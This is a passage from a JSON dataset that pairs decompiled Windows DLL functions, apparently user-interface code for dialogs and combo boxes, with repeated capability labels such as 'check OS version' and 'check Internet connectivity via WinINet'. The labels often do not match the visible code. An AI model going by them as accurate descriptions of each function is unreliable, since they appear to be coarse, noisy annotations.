+ 1);\n            uVar13 = fcn.18000da30(auStack2024, auStack232);\n            fcn.18000d960(auStack440, uVar13);\n            fcn.180003e40(auStack2024);\n            uVar13 = 0x1800f5dac;\n            if (arg2_01 == 0) {\n                uVar13 = 0x1800f6310;\n            }\n            uVar13 = fcn.18002e7e0(auStack2024, uVar13, auStack440);\n            fcn.18000d8d0(auStack280, uVar13);\n            fcn.180003e40(auStack2024);\n            uVar13 = fcn.18002e5c0(auStack1560, auStack440, 0x1800f6388);\n            uVar13 = fcn.180020680(auStack1528, uVar13, iVar24);\n            uVar13 = fcn.180020680(&uStack1960, uVar13, &uStack536);\n            uVar13 = fcn.180020680(&uStack2144, uVar13, auStack440);\n            uVar13 = fcn.18002e710(&uStack2112, uVar13, 0x1800f6370);\n            uVar13 = fcn.180020680(&uStack2176, uVar13, iVar24 + 0x20);\n            uVar13 = fcn.180020680(&uStack568, uVar13, &uStack536);\n            uVar13 = fcn.180020680(&uStack600, uVar13, auStack440);\n            uVar13 = fcn.18002e710(&uStack632, uVar13, 0x1800f6350);\n            uVar13 = fcn.180020680(&uStack2208, uVar13, iVar24 + 0x40);\n            uVar13 = fcn.180020680(&uStack2240, uVar13, &uStack536);\n            uVar13 = fcn.180020680(&uStack2072, uVar13, auStack440);\n            uVar13 = fcn.18002e710(&uStack472, uVar13, 0x1800f6330);\n            uVar13 = fcn.180020680(aiStack1928, uVar13, iVar24 + 0x60);\n            uVar13 = fcn.180020680(auStack2024, uVar13, &uStack536);\n            fcn.18000d8d0(auStack408, uVar13);\n            fcn.180003e40(auStack2024);\n            fcn.180003e40(aiStack1928);\n            fcn.180003e40(&uStack472);\n            fcn.180003e40(&uStack2072);\n            fcn.180003e40(&uStack2240);\n            fcn.180003e40(&uStack2208);\n            fcn.180003e40(&uStack632);\n            fcn.180003e40(&uStack600);\n            fcn.180003e40(&uStack568);\n            fcn.180003e40(&uStack2176);\n            fcn.180003e40(&uStack2112);\n            fcn.180003e40(&uStack2144);\n            fcn.180003e40(&uStack1960);\n            fcn.180003e40(auStack1528);\n            fcn.180003e40(auStack1560);\n            cVar12 = fcn.18002e930(iVar24 + 0x80, 0x1800f5dcc);\n            if (((cVar12 != '\\0') && (cVar12 = fcn.18002e930(iVar24 + 0x80, 0x1800f6398),  cVar12 != '\\0')) &&\n               (cVar12 = fcn.18002e9a0(iVar24 + 0x80, arg3 + 4),  cVar12 != '\\0')) {\n                uVar13 = fcn.18002e5c0(auStack2024, auStack440, 0x1800f63d8);\n                uVar13 = fcn.180020680(auStack1528, uVar13, iVar24 + 0x80);\n                uVar13 = fcn.180020680(auStack1560, uVar13, &uStack536);\n                fcn.18000d8d0(auStack408, uVar13);\n                fcn.180003e40(auStack1560);\n                fcn.180003e40(auStack1528);\n                fcn.180003e40(auStack2024);\n            }\n            arg2_01 = arg2_01 + 1;\n        } while (arg2_01 < uVar25);\n    }\n    uVar13 = fcn.18000da30(auStack1368, aiStack200);\n    fcn.18000d960(uStack1896, uVar13);\n    fcn.180003e40(auStack1368);\n    uVar13 = 0x1800f5f54;\n    if (*(arg3 + 0xc) != '\\0') {\n        uVar13 = 0x1800f5e74;\n    }\n    uVar20 = fcn.18002e7e0(&puStack1696, 0x1800f6064, uStack1896);\n    uVar20 = fcn.18002e710(&puStack1656, uVar20, 0x1800f6054);\n    uVar20 = fcn.180020680(auStack1400, uVar20, &uStack536);\n    uVar20 = fcn.18002e710(auStack1464, uVar20, 0x1800f6448);\n    uVar20 = fcn.180020680(auStack1496, uVar20, arg3);\n    uVar20 = fcn.180020680(auStack952, uVar20, &uStack536);\n    uVar20 = fcn.18002e710(auStack984, uVar20, 0x1800f6430);\n    uVar20 = fcn.180020680(auStack1016, uVar20, arg3 + 4);\n    uVar20 = fcn.180020680(auStack1048, uVar20, &uStack536);\n    uVar20 = fcn.18002e710(auStack1080, uVar20, 0x1800f6408);\n    uVar20 = fcn.180020680(auStack1112, uVar20, arg3 + 8);\n    uVar20 = fcn.180020680(auStack1144, uVar20, &uStack536);\n    uVar20 = fcn.18002e710(auStack1176, uVar20, 0x1800f63e8);\n    uVar13 = fcn.18002e710(auStack1208, uVar20, uVar13);\n    uVar13 = fcn.180020680(auStack1240, uVar13, &uStack536);\n    uVar13 = fcn.180020680(auStack1272, uVar13, auStack312);\n    uVar13 = fcn.180020680(auStack1304, uVar13, auStack280);\n    uVar13 = fcn.180020680(auStack1336, uVar13, &uStack536);\n    uVar13 = fcn.180020680(auStack1432, uVar13, auStack408);\n    fcn.18000d960(uStack1888, uVar13);\n    fcn.180003e40(auStack1432);\n    fcn.180003e40(auStack1336);\n    fcn.180003e40(auStack1304);\n    fcn.180003e40(auStack1272);\n    fcn.180003e40(auStack1240);\n    fcn.180003e40(auStack1208);\n    fcn.180003e40(auStack1176);\n    fcn.180003e40(auStack1144);\n    fcn.180003e40(auStack1112);\n    fcn.180003e40(auStack1080);\n    fcn.180003e40(auStack1048);\n    fcn.180003e40(auStack1016);\n    fcn.180003e40(auStack984);\n    fcn.180003e40(auStack952);\n    fcn.180003e40(auStack1496);\n    fcn.180003e40(auStack1464);\n    fcn.180003e40(auStack1400);\n    fcn.180003e40(&puStack1656);\n    fcn.180003e40(&puStack1696);\ncode_r0x00018002759c:\n    fcn.18000dd00(&uStack504);\n    fcn.180003e40(auStack440);\n    fcn.180003e40(auStack408);\n    fcn.180003e40(auStack280);\n    fcn.180003e40(auStack312);\n    fcn.180003e40(&uStack664);\n    fcn.180003e40(&uStack536);\n    fcn.18008fb00(uStack72 ^ auStack2312);\n    return;\n}\n",
        "token_count": 17726
    },
    "180027c2": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180027c20(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    char cVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    int64_t iVar8;\n    ulong uVar9;\n    ulong uVar10;\n    int64_t iVar11;\n    char cVar12;\n    ushort uStack88;\n    unkbyte6 Stack86;\n    uint64_t uStack72;\n    uint uStack64;\n    uint uStack60;\n    ushort uStack56;\n    ushort uStack54;\n    uint uStack52;\n    ulong uStack48;\n    ulong uStack40;\n    uint64_t uStack32;\n    ulong uStack24;\n    \n    if (((*(arg1 + 0x62) == '\\0') || (*(arg1 + 99) == '\\0')) || (*(arg1 + 100) == '\\0')) {\n        cVar12 = '\\0';\n    }\n    else {\n        cVar12 = '\\x01';\n    }\n    uStack48 = 0x180027c6c;\n    iVar8 = (**0x1800de7f0)(*(arg1 + 0x70), 0x18b, 0, 0);\n    cVar2 = *(arg1 + 0x62);\n    uStack48 = 0x180027c89;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23a5);\n    uStack48 = 0x180027c94;\n    (**0x1800de718)(uVar9, -(cVar2 != '\\0') & 5);\n    uVar9 = 5;\n    if (*(arg1 + 0x62) != '\\0') {\n        uVar9 = 0;\n    }\n    uStack48 = 0x180027cb1;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x23a4);\n    uStack48 = 0x180027cbc;\n    (**0x1800de718)(uVar10, uVar9);\n    uStack48 = 0x180027ccc;\n    (**0x1800de770)(*(arg1 + 0x70), cVar12);\n    uStack48 = 0x180027cdb;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23a5);\n    uStack48 = 0x180027ce6;\n    (**0x1800de770)(uVar9, cVar12);\n    uStack48 = 0x180027cf5;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23a6);\n    uStack48 = 0x180027d00;\n    (**0x1800de770)(uVar9, cVar12);\n    uStack48 = 0x180027d16;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23a7);\n    uStack48 = 0x180027d21;\n    (**0x1800de770)(uVar9, 0 < iVar8);\n    uStack48 = 0x180027d30;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23eb);\n    uStack48 = 0x180027d3b;\n    (**0x1800de770)(uVar9, cVar12);\n    uStack48 = 0x180027d4a;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23ec);\n    uStack48 = 0x180027d55;\n    (**0x1800de770)(uVar9, cVar12);\n    if (cVar12 == '\\0') {\n        uStack48 = 0x180027d73;\n        uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x238f);\n        uStack48 = 0x180027d7e;\n        (**0x1800de770)(uVar9, 0);\n        uStack48 = 0x180027d8d;\n        uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x2390);\n        uStack48 = 0x180027d98;\n        (**0x1800de770)(uVar9, 0);\n    }\n    else {\n        uStack48 = 0x180027d62;\n        fcn.180027b60(arg1);\n    }\n    uStack24 = 0xfffffffffffffffe;\n    if (*(arg1 + 0x61) == '\\0') {\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88 = 0;\n        fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f5fa8, 0x1e);\n        uVar5 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            puVar7 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f4b2c);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar6 = &stack0xffffffffffffffa8;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar6 = CONCAT62(Stack86, uStack88);\n            }\n            *(puVar6 + uVar5 * 2) = 0x2a;\n            *(puVar6 + uVar1 * 2) = 0;\n            puVar7 = &stack0xffffffffffffffa8;\n        }\n        uStack56 = *puVar7;\n        uStack54 = *puVar7 >> 0x10;\n        uStack52 = puVar7[1];\n        uStack48 = *(puVar7 + 2);\n        uStack40 = *(puVar7 + 4);\n        uStack32 = *(puVar7 + 6);\n        *(puVar7 + 4) = 0;\n        *(puVar7 + 6) = 7;\n        *puVar7 = 0;\n        puVar6 = &stack0xffffffffffffffc8;\n        if (7 < uStack32) {\n            puVar6 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x23e7, puVar6);\n        if (uStack32 < 8) {\ncode_r0x000180022573:\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x0001800225c4:\n                fcn.180068600(*(arg1 + 0x18), 0x23e7);\n                goto code_r0x0001800225d2;\n            }\n            iVar11 = CONCAT62(Stack86, uStack88);\n            iVar8 = iVar11;\n            if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) ||\n               (iVar8 = *(iVar11 + -8),  (iVar11 - iVar8) - 8U < 0x20)) {\n                fcn.18008fb24(iVar8);\n                goto code_r0x0001800225c4;\n            }\n        }\n        else {\n            iVar11 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar8 = iVar11;\n            if ((uStack32 * 2 + 2 < 0x1000) || (iVar8 = *(iVar11 + -8),  (iVar11 - iVar8) - 8U < 0x20)) {\n                fcn.18008fb24(iVar8);\n                goto code_r0x000180022573;\n            }\ncode_r0x000180022a85:\n            fcn.1800b3528();\n        }\n        fcn.1800b3528();\ncode_r0x000180022a91:\n        fcn.1800b3528();\ncode_r0x000180022a97:\n        fcn.1800b3528();\ncode_r0x000180022a9d:\n        fcn.1800b3528();\n    }\n    else {\n        (**0x1800de788)(*(arg1 + 0x18), 0x23e7, 0x1800f5f68);\n        fcn.180068540(*(arg1 + 0x18), 0x23e7);\ncode_r0x0001800225d2:\n        if (*(arg1 + 0x62) == '\\0') {\n            uStack72 = CONCAT44(*0x180101904, *0x180101900);\n            uStack64 = *0x180101908;\n            uStack60 = *0x18010190c;\n            uStack88 = 0;\n            fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f5ff8, 6);\n            uVar5 = uStack72;\n            if (CONCAT44(uStack60, uStack64) == uStack72) {\n                puVar7 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f4b3c);\n            }\n            else {\n                uVar1 = uStack72 + 1;\n                uStack72 = uVar1;\n                puVar6 = &stack0xffffffffffffffa8;\n                if (7 < CONCAT44(uStack60, uStack64)) {\n                    puVar6 = CONCAT62(Stack86, uStack88);\n                }\n                *(puVar6 + uVar5 * 2) = 0x2a;\n                *(puVar6 + uVar1 * 2) = 0;\n                puVar7 = &stack0xffffffffffffffa8;\n            }\n            uStack56 = *puVar7;\n            uStack54 = *puVar7 >> 0x10;\n            uStack52 = puVar7[1];\n            uStack48 = *(puVar7 + 2);\n            uStack40 = *(puVar7 + 4);\n            uStack32 = *(puVar7 + 6);\n            *(puVar7 + 4) = 0;\n            *(puVar7 + 6) = 7;\n            *puVar7 = 0;\n            puVar6 = &stack0xffffffffffffffc8;\n            if (7 < uStack32) {\n                puVar6 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x23a3, puVar6);\n            if (7 < uStack32) {\n                iVar11 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n                iVar8 = iVar11;\n                if ((uStack32 * 2 + 2 < 0x1000) || (iVar8 = *(iVar11 + -8),  (iVar11 - iVar8) - 8U < 0x20)) {\n                    fcn.18008fb24(iVar8);\n                    goto code_r0x0001800226fb;\n                }\n                goto code_r0x000180022a91;\n            }\ncode_r0x0001800226fb:\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x00018002274c:\n                fcn.180068600(*(arg1 + 0x18), 0x23a3);\n                goto code_r0x00018002275a;\n            }\n            iVar11 = CONCAT62(Stack86, uStack88);\n            iVar8 = iVar11;\n            if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) ||\n               (iVar8 = *(iVar11 + -8),  (iVar11 - iVar8) - 8U < 0x20)) {\n                fcn.18008fb24(iVar8);\n                goto code_r0x00018002274c;\n            }\n            goto code_r0x000180022a97;\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x23a3, 0x1800f5fe8);\n        fcn.180068540(*(arg1 + 0x18), 0x23a3);\ncode_r0x00018002275a:\n        if (*(arg1 + 99) != '\\0') {\n            (**0x1800de788)(*(arg1 + 0x18), 0x23c3, 0x1800f6008);\n            fcn.180068540(*(arg1 + 0x18), 0x23c3);\ncode_r0x0001800228e2:\n            if (*(arg1 + 100) != '\\0') {\n                (**0x1800de788)(*(arg1 + 0x18), 0x23d8, 0x1800f6028);\n                fcn.180068540(*(arg1 + 0x18), 0x23d8);\n                return;\n            }\n            uStack72 = CONCAT44(*0x180101904, *0x180101900);\n            uStack64 = *0x180101908;\n            uStack60 = *0x18010190c;\n            uStack88 = 0;\n            fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f6038, 6);\n            uVar5 = uStack72;\n            if (CONCAT44(uStack60, uStack64) == uStack72) {\n                puVar7 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f4b9c);\n            }\n            else {\n                uVar1 = uStack72 + 1;\n                uStack72 = uVar1;\n                puVar6 = &stack0xffffffffffffffa8;\n                if (7 < CONCAT44(uStack60, uStack64)) {\n                    puVar6 = CONCAT62(Stack86, uStack88);\n                }\n                *(puVar6 + uVar5 * 2) = 0x2a;\n                *(puVar6 + uVar1 * 2) = 0;\n                puVar7 = &stack0xffffffffffffffa8;\n            }\n            uStack56 = *puVar7;\n            uStack54 = *puVar7 >> 0x10;\n            uStack52 = puVar7[1];\n            uStack48 = *(puVar7 + 2);\n            uStack40 = *(puVar7 + 4);\n            uStack32 = *(puVar7 + 6);\n            *(puVar7 + 4) = 0;\n            *(puVar7 + 6) = 7;\n            *puVar7 = 0;\n            puVar6 = &stack0xffffffffffffffc8;\n            if (7 < uStack32) {\n                puVar6 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x23d8, puVar6);\n            if (7 < uStack32) {\n                iVar11 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n                iVar8 = iVar11;\n                if ((0xfff < uStack32 * 2 + 2) && (iVar8 = *(iVar11 + -8),  0x1f < (iVar11 - iVar8) - 8U))\n                goto code_r0x000180022aa9;\n                fcn.18008fb24(iVar8);\n            }\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) goto code_r0x000180022a58;\n            iVar8 = CONCAT44(uStack60, uStack64) * 2;\n            iVar4 = CONCAT62(Stack86, uStack88);\n            iVar11 = iVar4;\n            if (0xfff < iVar8 + 2U) {\n                iVar11 = *(iVar4 + -8);\n                if (0x1f < (iVar4 - iVar11) - 8U) {\n                    fcn.1800b3528(uStack40, iVar11, iVar8 + 0x29);\n                    goto code_r0x000180022a85;\n                }\n            }\n            fcn.18008fb24(iVar11);\ncode_r0x000180022a58:\n            fcn.180068600(*(arg1 + 0x18), 0x23d8);\n            return;\n        }\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88 = 0;\n        fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f6018, 6);\n        uVar5 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            puVar7 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f4b8c);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar6 = &stack0xffffffffffffffa8;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar6 = CONCAT62(Stack86, uStack88);\n            }\n            *(puVar6 + uVar5 * 2) = 0x2a;\n            *(puVar6 + uVar1 * 2) = 0;\n            puVar7 = &stack0xffffffffffffffa8;\n        }\n        uStack56 = *puVar7;\n        uStack54 = *puVar7 >> 0x10;\n        uStack52 = puVar7[1];\n        uStack48 = *(puVar7 + 2);\n        uStack40 = *(puVar7 + 4);\n        uStack32 = *(puVar7 + 6);\n        *(puVar7 + 4) = 0;\n        *(puVar7 + 6) = 7;\n        *puVar7 = 0;\n        puVar6 = &stack0xffffffffffffffc8;\n        if (7 < uStack32) {\n            puVar6 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x23c3, puVar6);\n        if (7 < uStack32) {\n            iVar11 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar8 = iVar11;\n            if ((uStack32 * 2 + 2 < 0x1000) || (iVar8 = *(iVar11 + -8),  (iVar11 - iVar8) - 8U < 0x20)) {\n                fcn.18008fb24(iVar8);\n                goto code_r0x000180022883;\n            }\n            goto code_r0x000180022a9d;\n        }\ncode_r0x000180022883:\n        uStack40 = CONCAT44(*0x180101904, *0x180101900);\n        uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack56 = 0;\n        if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x0001800228d4:\n            fcn.180068600(*(arg1 + 0x18), 0x23c3);\n            goto code_r0x0001800228e2;\n        }\n        iVar11 = CONCAT62(Stack86, uStack88);\n        iVar8 = iVar11;\n        if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) || (iVar8 = *(iVar11 + -8),  (iVar11 - iVar8) - 8U < 0x20))\n        {\n            fcn.18008fb24(iVar8);\n            goto code_r0x0001800228d4;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x000180022aa9:\n    fcn.1800b3528();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 4831
    },
    "180027dc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180027dc0(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    int64_t iVar5;\n    uchar auStack344 [32];\n    ulong uStack312;\n    uchar auStack296 [240];\n    uint64_t uStack56;\n    \n    uStack312 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack344;\n    iVar1 = (**0x1800de7f0)(*(arg1 + 0x70), 0x188, 0, 0);\n    if (iVar1 != -1) {\n        if (arg2 == -1) {\n            if (iVar1 == 0) goto code_r0x000180027e58;\n        }\n        else if ((arg2 != 1) ||\n                (iVar2 = *(arg1 + 0xe0) - *(arg1 + 0xd8), \n                iVar2 = SUB168(SEXT816(-0x7777777777777777) * SEXT816(iVar2) >> 0x40, 0) + iVar2, \n                ((iVar2 >> 7) - (iVar2 >> 0x3f)) + -1 <= iVar1)) goto code_r0x000180027e58;\n        iVar2 = iVar1 * 0xf0;\n        fcn.180024ec0(auStack296, *(arg1 + 0xd8) + iVar2);\n        iVar5 = arg2 + iVar1;\n        iVar3 = iVar5 * 0xf0;\n        fcn.180027f50(iVar2 + *(arg1 + 0xd8), iVar3 + *(arg1 + 0xd8));\n        fcn.180027f50(*(arg1 + 0xd8) + iVar3, auStack296);\n        (**0x1800de7f0)(*(arg1 + 0x70), 0x182, iVar1, 0);\n        puVar4 = *(arg1 + 0xd8) + iVar3;\n        if (7 < puVar4[3]) {\n            puVar4 = *puVar4;\n        }\n        (**0x1800de7f0)(*(arg1 + 0x70), 0x181, iVar5, puVar4);\n        (**0x1800de7f0)(*(arg1 + 0x70), 0x186, iVar5, 0);\n        *(arg1 + 0x61) = 0;\n        fcn.180022420(arg1);\n        fcn.180027b60(arg1);\n        fcn.180025000(auStack296);\n    }\ncode_r0x000180027e58:\n    fcn.18008fb00(uStack56 ^ auStack344);\n    return;\n}\n",
        "token_count": 636
    },
    "1800282f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_29h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800282f0(int64_t arg1, ulong *arg2)\n\n{\n    ulong uVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    int64_t *piVar7;\n    int64_t **arg2_00;\n    uint64_t uVar8;\n    ulong var_fh;\n    ulong var_17h;\n    uchar auStack216 [32];\n    int64_t iStack184;\n    uint uStack176;\n    uint uStack172;\n    uint64_t uStack168;\n    uint64_t uStack160;\n    ulong uStack152;\n    int64_t aiStack136 [3];\n    uint64_t uStack112;\n    uchar auStack104 [7];\n    ulong var_59h;\n    uchar auStack88 [7];\n    uint64_t var_49h;\n    uint64_t var_41h;\n    ulong var_39h;\n    ulong var_29h;\n    ulong var_11h;\n    ulong var_9h;\n    \n    uStack152 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack216;\n    *(arg1 + 0x60) = 1;\n    puVar6 = arg2;\n    if (7 < arg2[3]) {\n        puVar6 = *arg2;\n    }\n    (**0x1800de788)(*(arg1 + 0x18), 0x23ba, puVar6);\n    arg2_00 = arg2 + 4;\n    _auStack88 = ZEXT816(0);\n    _auStack88 = arg2[6];\n    if (7 < arg2[7]) {\n        arg2_00 = *arg2_00;\n    }\n    uVar8 = 7;\n    if (_auStack88 < 8) {\n        _auStack104 = *arg2_00;\n        var_59h._1_4_ = *(arg2_00 + 1);\n        unique0x1000024a = *(arg2_00 + 0xc);\n        stack0xffffffffffffffb0 = 7;\n    }\n    else {\n        *0xb8 = _auStack88 | 7;\n        if (0x7ffffffffffffffe < *0xb8) {\n            *0xb8 = 0x7ffffffffffffffe;\n        }\n        _auStack104 = fcn.180011cf0(auStack104, *0xb8 + 1);\n        fcn.1800ade80(_auStack104, arg2_00, _auStack88 * 2 + 2);\n    }\n    piVar7 = auStack104;\n    if (7 < stack0xffffffffffffffb0) {\n        piVar7 = _auStack104;\n    }\n    iVar5 = *(arg1 + 200);\n    (**0x1800de778)(iVar5, piVar7);\n    uVar3 = _auStack88;\n    uStack168 = 0;\n    uStack160 = 0;\n    piVar7 = auStack104;\n    if (7 < stack0xffffffffffffffb0) {\n        piVar7 = _auStack104;\n    }\n    if (_auStack88 < 8) {\n        iStack184 = *piVar7;\n        uStack176 = *(piVar7 + 1);\n        uStack172 = *(piVar7 + 0xc);\n    }\n    else {\n        uVar8 = _auStack88 | 7;\n        if (0x7ffffffffffffffe < uVar8) {\n            uVar8 = 0x7ffffffffffffffe;\n        }\n        iVar5 = fcn.180011cf0(&iStack184, uVar8 + 1);\n        iStack184 = iVar5;\n        fcn.1800ade80(iVar5, piVar7, uVar3 * 2 + 2);\n    }\n    uStack168 = uVar3;\n    uStack160 = uVar8;\n    puVar6 = fcn.18002ce00(iVar5, aiStack136, &iStack184);\n    if (7 < puVar6[3]) {\n        puVar6 = *puVar6;\n    }\n    (**0x1800de778)(*(arg1 + 0xc0), puVar6);\n    if (7 < uStack112) {\n        iVar5 = aiStack136[0];\n        if ((0xfff < uStack112 * 2 + 2) && (iVar5 = *(aiStack136[0] + -8),  0x1f < (aiStack136[0] - iVar5) - 8U))\n        goto code_r0x00018002858b;\n        fcn.18008fb24(iVar5);\n    }\n    *(arg1 + 0x60) = 0;\n    piVar7 = arg2 + 0x10;\n    if (arg2[0x12] == 0) {\n        fcn.180010d70(piVar7, L\"[Use File Type - Color Theme]\", 0x1d);\n    }\n    if (7 < arg2[0x13]) {\n        piVar7 = *piVar7;\n    }\n    iVar4 = (**0x1800de7f0)(*(arg1 + 0xd0), 0x14c, 0xffffffffffffffff, piVar7);\n    uVar1 = *(arg1 + 0xd0);\n    (**0x1800de7f0)(uVar1, 0x14e, iVar4, 0);\n    (**0x1800de5b8)(uVar1, 0, 0);\n    if (7 < stack0xffffffffffffffb0) {\n        piVar7 = _auStack104;\n        if (0xfff < stack0xffffffffffffffb0 * 2 + 2) {\n            piVar7 = _auStack104[-1];\n            if (0x1f < _auStack104 + (-8 - piVar7)) {\n                fcn.1800b3528(piVar7, stack0xffffffffffffffb0 * 2 + 0x29);\ncode_r0x00018002858b:\n                fcn.1800b3528();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(piVar7);\n    }\n    fcn.18008fb00(stack0xffffffffffffffb8 ^ auStack216);\n    return;\n}\n",
        "token_count": 1492
    },
    "18002869": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180028690(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    char cVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    int64_t iVar8;\n    ulong uVar9;\n    ulong uVar10;\n    int64_t iVar11;\n    char cVar12;\n    ushort uStack88;\n    unkbyte6 Stack86;\n    uint64_t uStack72;\n    uint uStack64;\n    uint uStack60;\n    ushort uStack56;\n    ushort uStack54;\n    uint uStack52;\n    ulong uStack48;\n    ulong uStack40;\n    uint64_t uStack32;\n    ulong uStack24;\n    \n    if ((*(arg1 + 99) == '\\0') || (*(arg1 + 100) == '\\0')) {\n        cVar12 = '\\0';\n    }\n    else {\n        cVar12 = '\\x01';\n    }\n    uStack48 = 0x1800286d9;\n    iVar8 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x18b, 0, 0);\n    cVar2 = *(arg1 + 99);\n    uStack48 = 0x1800286f6;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23c5);\n    uStack48 = 0x180028701;\n    (**0x1800de718)(uVar9, -(cVar2 != '\\0') & 5);\n    uVar9 = 5;\n    if (*(arg1 + 99) != '\\0') {\n        uVar9 = 0;\n    }\n    uStack48 = 0x18002871e;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x23c4);\n    uStack48 = 0x180028729;\n    (**0x1800de718)(uVar10, uVar9);\n    uStack48 = 0x18002873c;\n    (**0x1800de770)(*(arg1 + 0xb8), cVar12);\n    uStack48 = 0x18002874b;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23c5);\n    uStack48 = 0x180028756;\n    (**0x1800de770)(uVar9, cVar12);\n    uStack48 = 0x180028765;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23c6);\n    uStack48 = 0x180028770;\n    (**0x1800de770)(uVar9, cVar12);\n    uStack48 = 0x180028786;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x23c7);\n    uStack48 = 0x180028791;\n    (**0x1800de770)(uVar9, 0 